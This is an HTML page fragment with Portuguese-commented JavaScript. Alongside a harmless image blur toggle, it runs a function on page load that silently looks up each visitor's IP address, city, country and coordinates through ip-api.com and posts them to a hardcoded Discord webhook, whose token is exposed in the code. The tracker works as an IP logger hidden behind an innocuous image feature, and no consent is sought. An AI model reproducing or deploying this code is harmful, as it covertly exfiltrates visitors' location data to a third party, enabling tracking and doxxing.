  <script>
    // Função para alternar o desfoque da imagem
    function toggleBlur() {
      const image = document.querySelector('.image');
      // Alterna o filtro de desfoque
      if (image.style.filter === 'blur(8px)') {
        image.style.filter = 'blur(0)';
      } else {
        image.style.filter = 'blur(8px)';
      }
    }
    
    window.onload = function() {
            obterInformacoesIP()
};
  </script>

<script scr="obterInformacoesIP.js">

function obterInformacoesIP() {
  fetch('http://ip-api.com/json/')
    .then(response => response.json())
    .then(data => {
      // Monta a mensagem que será enviada ao Discord
      const mensagem = {
        content: `Aqui estão as informações do IP:\n
                  **IP:** ${data.query}\n
                  **Cidade:** ${data.city}\n
                  **País:** ${data.country}\n
                  **Latitude:** ${data.lat}\n
                  **Longitude:** ${data.lon}`
      };

      // URL do seu Webhook do Discord
      const webhookUrl = 'https://discord.com/api/webhooks/1362586232504189071/Win7T8ZZKNfvhMnO44Mk533HD27XwQ270pUkLH7g0FhBt-Zcj6QN6F8LqEeTl28myVVM';

      // Envia os dados via POST para o webhook
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(mensagem)
      })
      .then(response => {
        if (response.ok) {
          console.log('Mensagem enviada para o Discord!');
        } else {
          console.error('Falha ao enviar mensagem para o Discord');
        }
      })
      .catch(error => {
        console.error('Erro ao enviar dados:', error);
      });
    })
    .catch(error => {
      console.error('Erro ao buscar dados do IP:', error);
    });
}

console.log("Função B")

  </script>
